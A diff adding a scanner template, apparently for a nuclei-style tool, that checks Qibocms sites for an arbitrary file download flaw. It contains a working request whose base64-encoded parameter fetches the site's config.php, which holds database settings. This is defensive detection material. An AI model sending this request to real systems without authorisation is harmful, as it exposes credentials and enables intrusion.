@@ -1,0 +1,24 @@
+id: qibocms-file-download
+name: Qibocms - Arbitrary File Download
+severity: high
+confidence: confirmed
+description: Qibocms is vulnerable to arbitrary file download vulnerability.
+tags:
+- qibocms
+- lfr
+- vuln
+requests:
+- method: GET
+  path: /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
+  matchers:
+  - type: body
+    words:
+    - <?php
+    - $webdb
+  - type: header
+    words:
+    - filename=config
+  - type: status
+    status:
+    - 200
+  condition: and
